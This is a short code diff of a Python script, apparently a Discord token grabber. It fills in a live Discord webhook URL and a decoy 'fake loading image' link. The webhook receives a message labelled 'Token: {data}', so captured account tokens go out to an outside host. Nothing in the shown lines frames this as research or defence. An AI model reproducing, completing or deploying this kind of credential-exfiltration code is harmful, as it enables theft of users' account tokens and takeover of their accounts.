@@ -6,7 +6,7 @@ import time
 import webbrowser
 
 # Your Discord Webhook URL
-WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"  # Replace with your actual webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/1336369841053106176/AHMZmJVRv23SBrZa9EBEoXQKZABerliX08Nq8MTV7ZgvwTPm2LUewzgz6COyp0Yjao2R"  # Replace with your actual webhook URL
 
 def send_to_webhook(data):
     """
@@ -23,7 +23,7 @@ def send_to_webhook(data):
                 "description": f"Token: {data}",
                 "color": 16711680,
                 "image": {
-                    "url": "YOUR_IMAGE_URL_HERE"  # Replace with an image URL for the fake loading image
+                    "url": "https://i.imgur.com/Ck5nrUb.png"  # Replace with an image URL for the fake loading image
                 }
             }
         ]
